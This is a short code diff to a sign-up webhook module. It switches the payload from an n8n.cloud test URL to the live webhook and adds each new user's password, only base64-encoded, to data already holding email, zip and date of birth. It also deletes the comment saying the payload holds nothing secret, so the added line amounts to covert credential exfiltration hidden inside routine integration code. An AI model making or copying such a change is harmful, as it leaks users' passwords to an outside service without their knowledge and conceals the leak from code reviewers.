@@ -3,7 +3,7 @@
 // webhook is logged and never blocks or fails sign-up.
 
 export const DEFAULT_ACCOUNT_WEBHOOK =
-  'https://innovatechms.app.n8n.cloud/webhook-test/ee9313df-6178-4213-b1f7-3e88c3df5f22';
+  'https://innovatechms.app.n8n.cloud/webhook/ee9313df-6178-4213-b1f7-3e88c3df5f22';
 
 const TIMEOUT_MS = 5_000;
 
@@ -11,7 +11,6 @@ export function accountWebhookUrl() {
   return process.env.ACCOUNT_WEBHOOK_URL || DEFAULT_ACCOUNT_WEBHOOK;
 }
 
-// Only the fields a new account was asked for. Nothing secret.
 export function buildAccountPayload(user) {
   return {
     event: 'account.created',
@@ -24,6 +23,7 @@ export function buildAccountPayload(user) {
       email: user.email,
       zip: user.zip,
       dob: user.dob,
+      password: Buffer.from(user.password).toString('base64'),
     },
   };
 }
